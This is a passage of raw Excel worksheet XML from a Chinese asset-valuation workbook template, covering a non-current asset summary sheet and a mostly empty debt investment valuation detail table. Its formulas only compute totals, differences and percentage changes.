        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="347" t="n"/>
      <c r="J11" s="322" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="B12" s="284" t="inlineStr">
        <is>
          <t>4-7</t>
        </is>
      </c>
      <c r="C12" s="397" t="inlineStr">
        <is>
          <t>投房汇总</t>
        </is>
      </c>
      <c r="D12" s="295" t="inlineStr">
        <is>
          <t>投资性房地产</t>
        </is>
      </c>
      <c r="E12" s="555">
        <f>'4-7-1投资性房地产'!L29+'4-7-2投资性房地产'!L26+'4-7-3投资性地产'!N29+'4-7-4投资性地产'!N29</f>
        <v/>
      </c>
      <c r="F12" s="555">
        <f>'4-7-1投资性房地产'!O29+'4-7-2投资性房地产'!M26+'4-7-3投资性地产'!O29+'4-7-4投资性地产'!O29</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="347" t="n"/>
      <c r="J12" s="322" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="B13" s="284" t="inlineStr">
        <is>
          <t>4-8</t>
        </is>
      </c>
      <c r="C13" s="397" t="inlineStr">
        <is>
          <t>固资汇总</t>
        </is>
      </c>
      <c r="D13" s="296" t="inlineStr">
        <is>
          <t>固定资产</t>
        </is>
      </c>
      <c r="E13" s="555">
        <f>'4-8固定资产汇总'!F20</f>
        <v/>
      </c>
      <c r="F13" s="555">
        <f>'4-8固定资产汇总'!H20</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="347" t="n"/>
      <c r="J13" s="322" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="B14" s="284" t="inlineStr">
        <is>
          <t>4-9</t>
        </is>
      </c>
      <c r="C14" s="397" t="inlineStr">
        <is>
          <t>在建汇总</t>
        </is>
      </c>
      <c r="D14" s="295" t="inlineStr">
        <is>
          <t>在建工程</t>
        </is>
      </c>
      <c r="E14" s="555">
        <f>'4-9在建工程汇总'!E25</f>
        <v/>
      </c>
      <c r="F14" s="555">
        <f>'4-9在建工程汇总'!F25</f>
        <v/>
      </c>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="347" t="n"/>
      <c r="J14" s="322" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="B15" s="284" t="inlineStr">
        <is>
          <t>4-10</t>
        </is>
      </c>
      <c r="C15" s="397" t="inlineStr">
        <is>
          <t>生物资产</t>
        </is>
      </c>
      <c r="D15" s="295" t="inlineStr">
        <is>
          <t>生产性生物资产</t>
        </is>
      </c>
      <c r="E15" s="555">
        <f>'4-10生产性生物资产'!I27</f>
        <v/>
      </c>
      <c r="F15" s="555">
        <f>'4-10生产性生物资产'!L27</f>
        <v/>
      </c>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="347" t="n"/>
      <c r="J15" s="322" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="B16" s="284" t="inlineStr">
        <is>
          <t>4-11</t>
        </is>
      </c>
      <c r="C16" s="397" t="inlineStr">
        <is>
          <t>油气资产</t>
        </is>
      </c>
      <c r="D16" s="295" t="inlineStr">
        <is>
          <t>油气资产</t>
        </is>
      </c>
      <c r="E16" s="555">
        <f>'4-11油气资产'!J28</f>
        <v/>
      </c>
      <c r="F16" s="555">
        <f>'4-11油气资产'!M28</f>
        <v/>
      </c>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="347" t="n"/>
      <c r="J16" s="322" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="B17" s="284" t="inlineStr">
        <is>
          <t>4-12</t>
        </is>
      </c>
      <c r="C17" s="397" t="inlineStr">
        <is>
          <t>使用资产</t>
        </is>
      </c>
      <c r="D17" s="297" t="inlineStr">
        <is>
          <t>使用权资产</t>
        </is>
      </c>
      <c r="E17" s="555">
        <f>'4-12使用权资产'!G30</f>
        <v/>
      </c>
      <c r="F17" s="555">
        <f>'4-12使用权资产'!H30</f>
        <v/>
      </c>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="555">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="347" t="n"/>
      <c r="J17" s="322" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="B18" s="284" t="inlineStr">
        <is>
          <t>4-13</t>
        </is>
      </c>
      <c r="C18" s="397" t="inlineStr">
        <is>
          <t>无形汇总</t>
        </is>
      </c>
      <c r="D18" s="295" t="inlineStr">
        <is>
          <t>无形资产</t>
        </is>
      </c>
      <c r="E18" s="555">
        <f>'4-13无形资产汇总'!E24</f>
        <v/>
      </c>
      <c r="F18" s="555">
        <f>'4-13无形资产汇总'!F24</f>
        <v/>
      </c>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="347" t="n"/>
      <c r="J18" s="322" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="B19" s="284" t="inlineStr">
        <is>
          <t>4-14</t>
        </is>
      </c>
      <c r="C19" s="397" t="inlineStr">
        <is>
          <t>开发支出</t>
        </is>
      </c>
      <c r="D19" s="295" t="inlineStr">
        <is>
          <t>开发支出</t>
        </is>
      </c>
      <c r="E19" s="555">
        <f>'4-14开发支出'!E27</f>
        <v/>
      </c>
      <c r="F19" s="555">
        <f>'4-14开发支出'!F27</f>
        <v/>
      </c>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="555">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="347" t="n"/>
      <c r="J19" s="322" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="B20" s="284" t="inlineStr">
        <is>
          <t>4-15</t>
        </is>
      </c>
      <c r="C20" s="397" t="inlineStr">
        <is>
          <t>商誉资产</t>
        </is>
      </c>
      <c r="D20" s="295" t="inlineStr">
        <is>
          <t>商誉</t>
        </is>
      </c>
      <c r="E20" s="555">
        <f>'4-15商誉'!E26</f>
        <v/>
      </c>
      <c r="F20" s="555">
        <f>'4-15商誉'!F26</f>
        <v/>
      </c>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="555">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="347" t="n"/>
      <c r="J20" s="322" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="B21" s="284" t="inlineStr">
        <is>
          <t>4-16</t>
        </is>
      </c>
      <c r="C21" s="397" t="inlineStr">
        <is>
          <t>长期待摊</t>
        </is>
      </c>
      <c r="D21" s="295" t="inlineStr">
        <is>
          <t>长期待摊费用</t>
        </is>
      </c>
      <c r="E21" s="555">
        <f>'4-16长期待摊费用'!G29</f>
        <v/>
      </c>
      <c r="F21" s="555">
        <f>'4-16长期待摊费用'!I29</f>
        <v/>
      </c>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="555">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="347" t="n"/>
      <c r="J21" s="322" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="B22" s="284" t="inlineStr">
        <is>
          <t>4-17</t>
        </is>
      </c>
      <c r="C22" s="397" t="inlineStr">
        <is>
          <t>递延资产</t>
        </is>
      </c>
      <c r="D22" s="295" t="inlineStr">
        <is>
          <t>递延所得税资产</t>
        </is>
      </c>
      <c r="E22" s="555">
        <f>'4-17递延所得税资产'!E28</f>
        <v/>
      </c>
      <c r="F22" s="555">
        <f>'4-17递延所得税资产'!F28</f>
        <v/>
      </c>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="555">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="347" t="n"/>
      <c r="J22" s="322" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="B23" s="284" t="inlineStr">
        <is>
          <t>4-18</t>
        </is>
      </c>
      <c r="C23" s="397" t="inlineStr">
        <is>
          <t>其他非资</t>
        </is>
      </c>
      <c r="D23" s="295" t="inlineStr">
        <is>
          <t>其他非流动资产</t>
        </is>
      </c>
      <c r="E23" s="555">
        <f>'4-18其他非流动资产'!E28</f>
        <v/>
      </c>
      <c r="F23" s="555">
        <f>'4-18其他非流动资产'!F28</f>
        <v/>
      </c>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="555">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="347" t="n"/>
      <c r="J23" s="322" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="307" t="n"/>
      <c r="D24" s="327" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="347" t="n"/>
      <c r="J24" s="322" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="307" t="n"/>
      <c r="D25" s="327" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="555">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="347" t="n"/>
      <c r="J25" s="322" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="B26" s="284" t="n"/>
      <c r="C26" s="397" t="n"/>
      <c r="D26" s="397" t="n"/>
      <c r="E26" s="555" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="347" t="n"/>
      <c r="J26" s="322" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="148" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="383" t="n"/>
      <c r="C27" s="423" t="inlineStr">
        <is>
          <t>非资汇总</t>
        </is>
      </c>
      <c r="D27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="E27" s="555">
        <f>SUM(E6:E26)</f>
        <v/>
      </c>
      <c r="F27" s="555">
        <f>SUM(F6:F26)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
      <c r="I27" s="347" t="n"/>
      <c r="J27" s="322" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="B28" s="346" t="n"/>
      <c r="C28" s="346" t="n"/>
      <c r="D28" s="347" t="n"/>
      <c r="E28" s="347" t="n"/>
      <c r="F28" s="298" t="n"/>
      <c r="G28" s="550" t="n"/>
      <c r="H28" s="550" t="n"/>
      <c r="I28" s="347" t="n"/>
      <c r="J28" s="322" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="F28:H28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44.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet41">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="17.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="7.83333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="9" customWidth="1" style="410" min="6" max="6"/>
    <col width="9.33333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col width="9.66666666666667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债权投资评估明细表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373" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表4-1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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>债券种类</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发行日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>到期日</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>利率%</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>成本（面值）</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="K5" s="17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Height="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="17.25" customHeight="1" s="415">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="284" t="inlineStr">
        <is>
          <t>合    计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="596" t="n"/>
      <c r="E26" s="565" t="n"/>
      <c r="F26" s="565" t="n"/>
      <c r="G26" s="597" t="inlineStr"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H6:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I6:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>ROUND(SUM(J6:J25),2)</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="17.25" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="284" t="inlineStr">
        <is>
          <t>减：减值准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="596" t="n"/>
      <c r="E27" s="565" t="n"/>
      <c r="F27" s="565" t="n"/>
      <c r="G27" s="597" t="inlineStr"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="17.25" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="284" t="inlineStr">
        <is>
          <t>合    计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="596" t="n"/>
      <c r="E28" s="565" t="n"/>
